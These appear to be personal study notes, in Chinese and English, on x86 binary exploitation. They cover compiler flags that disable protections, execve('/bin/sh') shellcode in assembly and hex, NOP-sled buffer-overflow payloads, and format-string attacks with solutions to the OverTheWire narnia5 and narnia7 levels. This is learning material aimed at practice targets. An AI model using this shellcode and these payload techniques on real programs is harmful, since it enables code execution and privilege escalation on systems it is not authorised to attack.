### Byte ordering

![image](https://slideplayer.com/slide/9303999/28/images/9/Byte+ordering+function+calls+%282%2F6%29.jpg)

![image](https://i.stack.imgur.com/fManS.png)

## 16进制hex里面每个字符(0->f)都代表4个bit
32位有8个hex decimal (4*8=32bits)
64位有16个hex decimal (4*16=64bits)


# shellcode 

### compile 

```
gcc -m32 -g -mpreferred-stack-boundary=2 -fno-stack-protector -Wl,-z,norelro -z execstack example.c -o example

-no-pie: disable PIE (position independent executable)
-z execstack: to disable NX (making stack executable)
-Wl,-z,norelro: disable RELRO (readonly relocations)
-fno-stack-protector: remove stack protection (stack overflow security checks)
And for convenience:

-g: add debugging

-mpreferred-stack-bounary=2: align stack on 4-byte boundary

---


nasm -f elf32 example.asm -o example.o

ld -m elf_i386 example.o

as --32 example.s -o example.o
```
- execstack: allow ....

### call from c
```
int (*foo)() = (int(*)())code;
  foo_value = foo();
  
OR
just
(*(void(*)()) shellcode)();

```


```
// nasm 
global _start

section .text
_start:
    jmp short call_shellcode

shellcode:
    pop ebx                    ; address of '/bin/sh'
    xor eax,eax
    mov al, 11                 ; 0xb
    int 0x80

call_shellcode:
    call shellcode
    message db "/bin/sh"       ; no need to add \0 manually



nasm -f elf32 example.asm -o example.o

ld -m elf_i386 example.o

./a.out

```


```
example2.asm (nasm) 25 bytes


global _start

section .text

_start:
	jmp getString

shell:
	xor eax, eax
	pop ebx
	xor ecx, ecx
	xor edx, edx
	mov al, 0xb
	int 0x80

getString:
	call shell
	db "/bin/sh"

\xeb\x0b\x31\xc0\x5b\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
```

## x86 Instructions 

The instruction ['test'](https://stackoverflow.com/a/13064985)


## NOP(No operation performed)

```
\x90
a sled，雪橇，EIP跟着NOP往前（高地址）滑，可以当作shellcode前面的填充物。

```

## GDB 

```
x/wx 。。。 记得加个w代表word，32位，不然的话会打印nibbles
```

## print shellcode bytes 

```
Example
$(python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "B"*4')

$(echo -n -e "\x31\xc0\x50\x68\x2f") 
$(echo -n -e "\x31\xc0\x50\x68\x2f") > inputFile  把inputFile里现有的内容删掉然后写入
$(echo -n -e "\x31\xc0\x50\x68\x2f") >> inputFile 在已有内容的后面添加
```


### 容易踩的陷阱
[link](https://stackoverflow.com/questions/38416045/im-trying-to-exploit-a-bufferoverflow-am-i-doing-something-wrong)
```
./vulne $(python -c 'print "\x90"*(256+4-25-40) + "\xeb\x0b\x31\xc0\x5b\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"+"\x90"*40 + "\x10\xd3\xff\xff"')
```
> 重点重点重点！！！！！ 注意看shellcode是在NOP sled的中间，而不是在最后


## Stack Alignment 

- GCC aligned default 16 bytes 
- 一旦local var >= 17，gcc就会分配32bytes
- 

## Vulnerability lists 

- [Format string vulnerability](https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf)
- 

### Format string vulnerability 
针对printf家族的函数

```
如果str来源不安全,
printf(str); 就能被攻击。
```
所以要满足以下条件
1. printf(str); 后续va_arg 参数不对
2. 攻击者能够操控str
3. 在str里放入%x,%s,%n等 specifiers

在printf那一行下一个断点，这一刻的stack：

![illlustration](./format_string_stack.png)

#### overthewire-narnia5

```
/narnia/narnia5 $(python -c 'print "\xd0\xd6\xff\xff"+"A"*496+"%n"')
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [????AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (63)
i = 1 (0xffffd4d0)
```
程序有提示i的地址，有时候不知为啥会变一点

solution:
```
/narnia/narnia5 $(python -c 'print "\xd0\xd6\xff\xff"+"A"*496+"%n"')
```
前四个byte \xd0\xd6\xff\xff 是main里整数变量i little endian版的地址，目标是把i的值从1改到500，由于已经有四个byte了，加496就是500，所以加一堆‘A'来凑数，最后%n是specifier，它的功能是把format string里%n之前的字符串长度写到一个int *地址里，正常使用是：
```
int x = 0;
printf("123%n", &x);
```
x就变成了3（“123”的长度）
利用这个specifier来写入进程里任意内存地址

### format string vulnerability - 继续～

[超级详细解释](https://cand-f18.unexploitable.systems/l/lab06/W6L2.pdf)

- 进程内地址任意读写为任意值
- 如果要写入的值太大就得分开两次写，具体看pdf



#### narnia 7 

```assembly
在call snprintf下一指令处下一个断点，

run $(python -c 'print "AAAA"')
Starting program: /narnia/narnia7 $(python -c 'print "AAAA"')
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd618)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x080486b2 in vuln ()
(gdb) x/20wx $esp
0xffffd60c:	0xffffd61c	0x00000080	0xffffd889	0x080486ff
0xffffd61c:	0x41414141	0x00000000	0x00000000	0x00000000
0xffffd62c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd63c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd64c:	0x00000000	0x00000000	0x00000000	0x00000000
```

由于x86通过压栈传参，esp后边三个0x00000080	0xffffd889	0x080486ff是snprintf的三个参数

如果snprintf以为自己还有第四个参数第五个等等，它会从0x080486ff的位置拿。我想要它拿我自定的数据，而我可控制的buffer从0x41414141那里开始，他们中间相距一个word(0x080486ff)，那么就叫他跳过这个word(%x)，读下一个word。

```
run $(python -c 'print "\xf8\xd5\xff\xff\xfa\xd5\xff\xff"+"%34588x%2$n%32992x%3$n"')
...
...
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd5f8)
I guess you want to come to the hackedfunction...
```

注意看argv[1]的开头，\xf8\xd5\xff\xff\xfa\xd5\xff\xff 是hackedfunction 地址的little endian版。后面的请看上面链接，这里再放一遍：[超级详细解释](https://cand-f18.unexploitable.systems/l/lab06/W6L2.pdf) 其中arbitrary write 那两页。

